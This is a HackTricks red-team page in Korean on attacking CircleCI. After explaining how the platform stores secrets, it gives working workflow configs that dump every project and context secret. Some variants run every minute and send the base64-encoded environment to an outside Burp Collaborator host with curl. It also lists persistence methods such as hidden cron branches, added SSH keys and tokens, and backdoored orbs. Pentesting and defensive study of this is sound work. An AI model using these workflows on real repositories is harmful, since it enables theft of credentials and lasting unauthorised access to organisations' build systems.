# CircleCI 보안

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)는 코드에 대해 수행할 작업과 수행 시기를 지정하는 **템플릿을 정의**할 수 있는 **지속적 통합 플랫폼**입니다. 이를 통해 테스트 또는 배포를 **자동화**할 수 있습니다. 예를 들어, **repo의 마스터 브랜치**에서 직접 수행할 수 있습니다.

## 권한

**CircleCI**는 로그인한 **계정**과 관련하여 github 및 bitbucket의 권한을 **상속**합니다.\
내 테스트에서는 **github의 repo에 대한 쓰기 권한**이 있다면, CircleCI에서 **프로젝트 설정을 관리**할 수 있습니다 (새로운 ssh 키 설정, 프로젝트 API 키 가져오기, 새로운 CircleCI 설정으로 새로운 브랜치 생성 등).

그러나, CircleCI 프로젝트로 repo를 **변환**하려면 **repo 관리자**여야 합니다.

## 환경 변수 및 비밀

[**문서**](https://circleci.com/docs/2.0/env-vars/)에 따르면, workflow 내에서 **환경 변수에 값을 로드**하는 다양한 방법이 있습니다.

### 내장 환경 변수

CircleCI에서 실행되는 모든 컨테이너는 항상 [**문서에 정의된 특정 환경 변수**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)를 가지고 있습니다. 예를 들어 `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME`, `CIRCLE_USERNAME`과 같은 변수입니다.

### 평문

**명령어** 내에서 평문으로 선언할 수 있습니다:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**실행 환경** 내에서 평문으로 선언할 수 있습니다:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job 환경** 내에서 그들을 평문으로 선언할 수 있습니다:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**컨테이너의 환경** 내에서 평문으로 선언할 수 있습니다:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### 프로젝트 비밀 정보

이러한 **비밀 정보**는 **프로젝트**에 의해서만 **접근 가능**합니다 (모든 브랜치에서).\
이러한 비밀 정보는 _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_에서 **선언된 것을 볼 수** 있습니다.

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**Import Variables**" 기능을 사용하면 다른 프로젝트에서 이 프로젝트로 **변수를 가져올 수** 있습니다.
{% endhint %}

### 컨텍스트 비밀 정보

이러한 비밀 정보는 **조직 전체**에 적용됩니다. **기본적으로 모든 저장소**가 여기에 저장된 비밀 정보에 **접근할 수 있습니다**:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
그러나, "모든 멤버" 대신에 다른 그룹을 선택하여 비밀 정보에 **특정 사람들에게만 접근 권한을 부여**할 수 있습니다.\
이는 비밀 정보의 보안을 **강화하는 가장 좋은 방법 중 하나**입니다. 모두가 접근하는 것이 아니라 일부 사람들만 접근할 수 있도록 하는 것입니다.
{% endhint %}

## 공격

### 평문 비밀 정보 검색

만약 **VCS에 접근할 수 있다면** (예: github), 각 저장소의 각 브랜치의 `.circleci/config.yml` 파일을 확인하고 거기에 저장된 **평문 비밀 정보**를 검색할 수 있습니다.

### 비밀 환경 변수 및 컨텍스트 열거

코드를 확인하면 각 `.circleci/config.yml` 파일에서 **사용되는 모든 비밀 이름**을 찾을 수 있습니다. 또한 이러한 파일에서 컨텍스트 이름을 가져오거나 웹 콘솔에서 확인할 수 있습니다: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### 프로젝트 비밀 정보 유출

{% hint style="warning" %}
프로젝트 및 컨텍스트 **비밀 정보를 모두 유출**하려면 전체 github 조직에서 **하나의 저장소에만 쓰기 권한**이 있어야 합니다 (_그리고 기본적으로 모든 컨텍스트에는 모든 사람이 접근할 수 있습니다_).
{% endhint %}

{% hint style="danger" %}
"**Import Variables**" 기능을 사용하면 다른 프로젝트에서 이 프로젝트로 **변수를 가져올 수** 있습니다. 따라서 공격자는 **모든 저장소의 프로젝트 변수를 가져온 다음 모두를 유출**할 수 있습니다.
{% endhint %}

모든 프로젝트 비밀 정보는 작업의 환경 변수에 설정되어 있으므로, env를 호출하고 base64로 난독화하면 비밀 정보가 **워크플로우 웹 로그 콘솔**에서 유출됩니다:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
만약 **웹 콘솔에 접근할 수 없지만** 레포지토리에 **접근할 수 있고**, CircleCI가 사용되고 있다는 것을 알고 있다면, **매 분마다 트리거되는 워크플로우**를 **생성**하여 **비밀 정보를 외부 주소로 유출**할 수 있습니다:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### 컨텍스트 비밀 정보 유출

**컨텍스트 이름을 지정**해야 합니다 (이는 프로젝트 비밀 정보도 유출됩니다):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
만약 **웹 콘솔에 접근할 수 없지만** 레포지토리에 **접근할 수 있고**, CircleCI가 사용되고 있다는 것을 알고 있다면, 매 분마다 **트리거되는 워크플로우를 수정**하여 **비밀 정보를 외부 주소로 유출**할 수 있습니다:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
새로운 `.circleci/config.yml`을 리포지토리에 생성하는 것만으로는 circleci 빌드를 트리거할 수 없습니다. circleci 콘솔에서 프로젝트로 활성화해야 합니다.
{% endhint %}

### 클라우드로 이동하기

**CircleCI**는 빌드를 **자체 머신 또는 사용자의 머신에서 실행할 수 있는 옵션**을 제공합니다.\
기본적으로 그들의 머신은 GCP에 위치하고 있으며, 처음에는 관련된 정보를 찾을 수 없을 것입니다. 그러나 피해자가 **자체 머신에서 작업을 실행하고 있다면(잠재적으로 클라우드 환경에서)** 흥미로운 정보가 있는 **클라우드 메타데이터 엔드포인트를 찾을 수 있을 수도 있습니다**.

이전 예제에서는 도커 컨테이너 내에서 모든 것을 실행했지만, **VM 머신을 실행하도록 요청**할 수도 있습니다(다른 클라우드 권한을 가질 수 있음):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
또는 원격 도커 서비스에 액세스 할 수 있는 도커 컨테이너:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 지속성

* CircleCI에서 **사용자 토큰을 생성**하여 사용자 액세스로 API 엔드포인트에 액세스할 수 있습니다.
* _https://app.circleci.com/settings/user/tokens_
* 프로젝트에 액세스할 수 있는 **프로젝트 토큰을 생성**할 수 있습니다. 토큰에 부여된 권한으로 프로젝트에 액세스할 수 있습니다.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* 프로젝트에 **SSH 키를 추가**할 수 있습니다.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 예상치 못한 프로젝트의 숨겨진 브랜치에 **크론 작업을 생성**하여 매일 모든 **컨텍스트 환경 변수를 노출**시킬 수 있습니다.
* 또는 알려진 작업을 브랜치에 생성/수정하여 매일 모든 컨텍스트와 **프로젝트 비밀**을 노출시킬 수 있습니다.
* GitHub 소유자인 경우 **검증되지 않은 오브**를 허용하고 작업에서 **백도어**로 구성할 수 있습니다.
* 일부 작업에서 **명령 주입 취약점**을 찾아 **비밀**을 수정하여 명령을 주입할 수 있습니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
